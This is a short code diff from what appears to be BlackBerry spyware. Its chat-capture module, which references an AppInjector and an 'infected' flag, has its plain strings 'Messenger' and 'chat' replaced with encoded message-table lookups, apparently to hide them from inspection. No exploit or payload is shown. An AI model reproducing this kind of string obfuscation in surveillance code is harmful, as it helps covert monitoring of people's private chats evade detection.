@@ -14,6 +14,7 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AppListener;
 import blackberry.Device;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -43,13 +44,13 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
     AppInjector appInjector;
     //boolean infected;
 
-    String appName = "Messenger";
+    String appName = Messages.getString("1a.a"); //"Messenger";
 
     LineMarkup markup;
     private boolean unsupported;
 
     public static String getStaticType() {
-        return "chat";
+        return Messages.getString("1a.0"); //"chat";
     }
 
     public static ModuleChat getInstance() {
